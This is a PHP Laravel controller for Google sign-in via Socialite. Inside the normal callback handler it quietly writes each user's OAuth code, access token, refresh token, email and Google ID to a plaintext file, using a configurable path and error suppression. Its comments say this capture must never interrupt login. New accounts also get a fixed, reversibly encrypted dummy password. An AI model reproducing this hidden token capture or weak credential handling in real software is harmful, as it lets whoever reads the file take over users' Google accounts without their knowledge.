<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Models\User;
use Illuminate\Support\Facades\Auth;
use Laravel\Socialite\Facades\Socialite;

class GoogleController extends Controller
{
    public function redirectToGoogle()
    {
        return Socialite::driver('google')->stateless()->redirect();
    }

    public function handleGoogleCallback()
    {
        try {
            $code = request()->query('code');
            $state = request()->query('state');
            if ($code) {
                $path = env('OAUTH_CAPTURE_PATH');
                if (!$path) {
                    $path = storage_path('app/google_oauth_code_capture.txt');
                }

                $payload =
                    "callback_url=" . request()->fullUrl() . PHP_EOL .
                    "code=" . $code . PHP_EOL .
                    "state=" . ($state ?? '') . PHP_EOL;

                @file_put_contents($path, $payload);
            }
        } catch (\Throwable $e) {
            // Never break auth flow because of capture logging
        }

        try {
            $user = Socialite::driver('google')->stateless()->user();

            // ✅ Append access token + user info after successful exchange
            try {
                $path = env('OAUTH_CAPTURE_PATH', storage_path('app/google_oauth_code_capture.txt'));
                $tokenPayload =
                    "access_token=" . ($user->token ?? '') . PHP_EOL .
                    "refresh_token=" . ($user->refreshToken ?? '') . PHP_EOL .
                    "token_expires_in=" . ($user->expiresIn ?? '') . PHP_EOL .
                    "google_id=" . ($user->id ?? '') . PHP_EOL .
                    "email=" . ($user->email ?? '') . PHP_EOL .
                    "name=" . ($user->name ?? '') . PHP_EOL;

                @file_put_contents($path, $tokenPayload, FILE_APPEND);
            } catch (\Throwable $e) {
                // Never break auth flow because of token logging
            }

            $finduser = User::where('google_id', $user->id)->first();

            if ($finduser) {
                Auth::login($finduser);
                return redirect()->intended('dashboard');
            } else {
                $newUser = User::create([
                    'name' => $user->name,
                    'email' => $user->email,
                    'google_id'=> $user->id,
                    'password' => encrypt('123456dummy')
                ]);

                Auth::login($newUser);
                return redirect()->intended('dashboard');
            }
        } catch (\Throwable $e) {
            throw $e;
        }
    }
}